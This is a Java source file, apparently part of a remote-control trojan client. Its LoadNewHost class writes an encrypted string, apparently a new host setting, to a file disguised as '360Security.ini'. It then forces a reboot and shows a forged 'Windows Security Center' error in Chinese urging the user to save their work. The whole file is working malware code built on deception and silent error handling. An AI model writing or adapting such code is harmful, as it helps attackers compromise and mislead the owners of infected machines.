package me.client.utils;

import com.sun.jna.WString;
import me.client.Client;

import java.io.FileOutputStream;
import java.net.Socket;

public class LoadNewHost {
    Socket socket;
    public LoadNewHost(Socket socket){
        this.socket = socket;
    }
    public void Load(String str) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(Client.getPath1() + "\\360Security.ini");
            fileOutputStream.write(AESUtils.encryption(str));
            fileOutputStream.close();
            Runtime.getRuntime().exec("shutdown -r -t 10");
            LoadDLL.instance.MessageErrorY(new WString("Windows安全中心"),new WString("Windows遇到了一些问题,现在需要重启,请保存你的工作"));
        }catch (Exception e) {
        }
    }
}